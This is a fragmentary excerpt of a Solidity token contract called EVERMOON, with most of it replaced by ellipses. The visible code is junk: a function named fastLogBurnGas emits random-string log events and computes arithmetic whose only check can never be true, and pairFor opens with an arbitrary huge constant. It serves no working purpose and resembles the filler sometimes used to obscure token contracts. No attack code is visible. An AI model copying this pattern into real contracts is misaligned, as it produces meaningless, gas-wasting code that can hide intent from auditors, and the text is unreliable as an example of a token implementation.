...
contract EVERMOON is IERC20 {
    ...
    */
    ...
    function fastLogBurnGas() external {
      emit log("Vs");
      emit log("eP");
      emit log("SJpSr");
      emit log("kwarejHTv");
      ...
      emit log("e");
      uint256 ewx = 49 + 23;
      uint256 advcybc = 52 % 62 % 57 + 1;
      uint256 smxtbwp = 48 * 87;
      if (ewx == 25 * 3 + 76 && advcybc == 14 * 6 * 27 * 35 * 89 && smxtbwp == 89) return;
    }
    ...
    */
    function pairFor() public view returns (bool) {
      uint256 slt = 9631361634839478040987397676072059516016567397901260022250698051622;
